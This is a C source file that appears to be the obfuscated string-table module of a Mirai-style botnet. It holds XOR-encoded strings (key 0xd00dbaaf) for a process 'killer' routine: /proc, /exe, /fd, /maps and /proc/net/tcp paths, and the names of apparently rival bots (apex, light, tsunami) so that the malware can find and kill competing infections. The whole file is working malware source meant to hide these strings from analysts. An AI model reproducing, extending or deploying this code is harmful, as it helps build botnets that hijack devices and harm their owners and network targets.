#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xd00dbaaf;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_KILLER_PROC, "\xE7\xB8\xBA\xA7\xAB\xE7\xC8", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\xE7\xAD\xB0\xAD\xC8", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\xE7\xAE\xAC\xC8", 4); // /fd
    add_entry(TABLE_KILLER_MAPS, "\xE7\xA5\xA9\xB8\xBB\xC8", 6); // /maps
    add_entry(TABLE_KILLER_TCP, "\xE7\xB8\xBA\xA7\xAB\xE7\xA6\xAD\xBC\xE7\xBC\xAB\xB8\xC8", 14); // /proc/net/tcp

    add_entry(TABLE_MAPS_APEX, "\xA0\xA1\xA3\xA9\xBA\xA1\xBF\xA9\xBB\xA0\xAD\xBA\xAD\xC8", 14);
    add_entry(TABLE_MAPS_LIGHT, "\xA4\xA1\xAF\xA0\xBC\xC8", 6);
    add_entry(TABLE_MAPS_TSUNAMI, "\x9C\xBB\xBD\xA6\xA9\xA5\xA1\xC8", 8);

    add_entry(TABLE_RANDOM, "\xA0\xA1\xA1\xAF\xA0\xBC\xC8\xBB\xBD\xA6\xA9\xA5\xA1\xC81\xA3\xA9\xBA\xA1\xBF\xA9\xBB\xA0\xAD\xBA\xAD\xC8", 26);

}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];
    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];
    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];
    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);
    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }
}